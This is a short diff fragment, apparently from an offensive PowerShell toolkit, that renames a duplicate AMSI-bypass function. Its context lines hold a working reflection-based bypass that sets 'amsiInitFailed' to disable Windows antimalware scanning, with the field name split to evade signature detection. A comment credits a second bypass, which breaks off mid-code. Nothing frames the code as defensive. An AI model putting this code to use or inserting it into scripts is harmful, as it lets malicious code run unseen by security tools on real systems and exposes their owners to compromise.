@@ -22,7 +22,7 @@ function Invoke-BypassAMSI {
     $Ref.GetField('amsiIn'+'itFailed','NonPublic,Static').SetValue($null,$true);
 }
 
-function Invoke-BypassAMSI {
+function Invoke-BypassAMSI2 {
     # rastamouse's AMSI bypass (Add-Type writes *.cs on disk!!)
     $id = get-random;
     $Ref = (
